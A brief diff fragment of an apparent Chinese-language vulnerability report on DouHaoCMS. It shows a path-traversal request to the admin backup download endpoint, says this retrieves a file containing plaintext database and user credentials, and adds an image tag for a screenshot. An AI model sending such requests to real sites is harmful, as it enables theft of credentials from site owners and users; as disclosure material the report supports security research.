@@ -24,3 +24,4 @@ http://Target/index.php?g=admin&m=backup&a=download&backup=.&file=../../install/
 成功下载并读取 temp_data.php 文件，内容包含数据库的明文账号密码和用户的账号密码
 
 ![DouHaoCMS 漏洞截图](https://raw.githubusercontent.com/kklzzcun/CMS/main/DouHaoCMS/assets/DouHao1.png)
+<img src="https://raw.githubusercontent.com/kklzzcun/CMS/main/DouHaoCMS/assets/DouHao1.png" alt="DouHaoCMS 漏洞截图" />
